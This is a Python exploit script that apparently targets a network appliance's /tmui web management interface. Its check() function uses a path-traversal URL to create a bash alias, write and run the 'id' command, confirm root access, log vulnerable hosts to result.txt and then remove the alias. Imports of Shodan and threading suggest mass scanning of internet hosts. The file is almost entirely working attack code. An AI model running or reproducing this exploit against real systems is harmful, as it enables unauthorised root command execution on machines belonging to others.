import re
import sys
import requests
from time import sleep
from shodan import Shodan
from datetime import datetime
from threading import Thread, activeCount


def check(ip, port):
    try:
        url1 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
        url2 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id'
        url3 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd'
        url4 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
        requests.get(url1.format(ip, port), verify=False, timeout=5)
        requests.get(url2.format(ip, port), verify=False, timeout=5)
        r = requests.get(url3.format(ip, port), verify=False, timeout=5)
        if ('uid=0(root)' in r.text):
            r = requests.get('https://{}:{}/tmui/login.jsp'.format(ip, port), verify=False, timeout=5)
            hostname = re.search('<p\\stitle=\\"(.*?)\\">', r.text).group(1).strip().lower()
            showSuccess('{} : {} - {} is vulnerable!'.format(ip, port, hostname))
            with open('result.txt', 'a+') as f:
                f.write('{}:{}  - {}\n'.format(ip, port, hostname))
                f.close()
        else:
            showFail('{} : {} is not vulnerable'.format(ip, port))
        requests.get(url4.format(ip, port), verify=False, timeout=5)
    except KeyboardInterrupt:
        exit('User aborted!')
    except Exception as e:
        showFail('{} : {} is not vulnerable'.format(ip, port))
